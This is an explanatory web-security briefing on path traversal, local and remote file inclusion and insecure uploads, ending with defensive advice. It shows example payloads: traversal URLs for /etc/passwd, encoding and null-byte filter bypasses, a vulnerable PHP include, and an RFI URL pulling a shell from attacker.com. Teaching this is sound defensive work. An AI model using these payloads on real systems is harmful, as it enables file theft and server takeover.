# Path Traversal and File Inclusion Vulnerabilities

Let's talk about some of the most common—and most dangerous—ways websites get hacked. It often boils down to something simple: trusting user input. When a web application handles files, whether it's displaying an image or letting a user upload a document, it's creating an opportunity. If not handled with extreme care, attackers can exploit this to read sensitive data, deface your site, or even take complete control of your server.

This briefing will walk you through three closely related threats: Path Traversal, File Inclusion (LFI/RFI), and Insecure File Uploads.

## Path Traversal: Escaping the Sandbox

At its core, a Path Traversal attack is about tricking a web application into accessing a file it was never supposed to. Think of the application as being told to stay within a specific folder, like `/var/www/images`. The attacker's goal is to give it instructions that make it "walk out" of that folder and into sensitive areas of the server.

### How it Works in Practice

Imagine a website that shows product images with a URL like this:
`https://insecure-website.com/loadImage?filename=218.png`

On the backend, the server takes `218.png` and adds it to its image directory, `/var/www/images/`, to get the full path.

An attacker realizes they can manipulate the filename. They use the sequence `../`, which is a universal command for "go up one directory."

**The Attack:** They send this URL:
`https://insecure-website.com/loadImage?filename=../../../etc/passwd`

**What the Server Sees:** The server obediently follows the instructions. Starting from `/var/www/images/`, it goes up three directories (`/var/www/` -\> `/var/` -\> `/`), landing it in the root directory. It then looks for `etc/passwd`.

The result? The contents of a critical system file containing the server's user list are sent back to the attacker instead of a picture.

### Outsmarting the Defenses

Developers often try to block this, but attackers are persistent. They get around simple filters by:

  * **URL Encoding:** Hiding the `../` from web filters by encoding it as `%2e%2e%2f`.
  * **Nested Sequences:** Using payloads like `....//` to bypass filters that only remove the sequence once.
  * **Absolute Paths:** Simply asking for the file directly, like `filename=/etc/passwd`, if the application doesn't sanitize the path.
  * **Null Byte Trick:** If the application forces a `.png` at the end, an attacker can use a null byte (`%00`) to terminate the filename early: `filename=../../../etc/passwd%00.png`. The system reads the path up to the null byte and ignores the rest.

## File Inclusion (LFI & RFI)

This is where Path Traversal goes from being a data-leak problem to a full-blown server takeover. Some web applications, especially older ones written in PHP, are built to dynamically include files to build a webpage.

### Local File Inclusion (LFI)

This is a Path Traversal attack where the goal isn't just to display a file, but to trick the application into **executing** it.

**Vulnerable Code:**

```php
<?php include($_GET['page']); ?>
```

**The Attack:** `http://example.com/index.php?page=../../../../etc/passwd`

In this case, the server will still show the contents of the password file. But the real danger is when an attacker can first upload a malicious file (like a web shell disguised as an image) and then use an LFI vulnerability to execute it. This combination gives them remote control.

### Remote File Inclusion (RFI)

RFI is even more direct and dangerous. It occurs when a misconfigured server allows the `include` function to fetch files from a remote URL.

**The Attack:** An attacker hosts a malicious script on their own server (`http://attacker.com/shell.php`). They then get the victim's server to run it with a simple URL:
`http://example.com/index.php?page=http://attacker.com/shell.php`

If this works, it's game over. The victim's server downloads and runs the attacker's code, handing over complete control.

> **The bottom line:** LFI uses a file already on the server; RFI pulls one from the internet. RFI is a direct path to compromise, while LFI often requires a file upload to be truly devastating.

## File Uploads: The Open Door

Almost every modern web app lets you upload something—a profile picture, a resume, a report. But this feature, if not built carefully, is like leaving a back door unlocked.

The number one risk is a **Web Shell**. This is a small, malicious script (e.g., a `.php` file) that an attacker uploads disguised as a normal file. If they can upload it and then access it through their browser, they get a command line interface to your server. From there, they can steal data, install malware, or use your server to attack others.

Other risks include:

  * Using path traversal in the filename to overwrite critical system files.
  * Uploading massive files to fill up your disk space (Denial of Service).
  * Uploading `.html` or `.svg` files with malicious JavaScript to attack other users (XSS).

-----

## How to Defend Your Server

The good news is that these attacks are preventable. It all comes back to one golden rule: **Never, ever trust user input.**

### For Path Traversal & LFI

  * **Don't use user input to build file paths.** This is the best defense. Instead of `page=contact.php`, use an ID like `page=contact` and have your code map that ID to a safe, hardcoded file path.
  * **Use a Whitelist.** If you must use user input, check it against a strict list of allowed values. If it's not on the list, reject it.
  * **Validate and Canonicalize.** After you've built a path, use the system's tools to resolve it to its true, absolute path. Then, check if that path still starts with the safe directory you intended. If not, you've detected a traversal attempt.
  * **Turn off remote inclusion.** For PHP, make sure `allow_url_include` is set to `Off` in your `php.ini`. This single setting shuts down RFI attacks.

### For Securing File Uploads

  * **Check the Extension AND Content.** Use a whitelist for safe file extensions (`.jpg`, `.png`, `.pdf`). Don't rely on blacklists. Also, check the file's actual content on the server to make sure a `.jpg` is really an image, not a renamed script.
  * **Rename Every File.** When a file is uploaded, give it a new, random, unpredictable name. This prevents an attacker from knowing the URL to their malicious script.
  * **Store Files Outside the Web Root.** This is the most powerful defense. Save uploaded files to a directory that can't be accessed by a URL. To let users download them, use a script that verifies permissions before serving the file. This way, a web shell can be uploaded but never executed.
  * **Set secure permissions** on the upload folder to prevent any scripts from running.
  * **Limit file sizes** to prevent denial of service.

## References

  * [PortSwigger: Path Traversal](https://portswigger.net/web-security/file-path-traversal)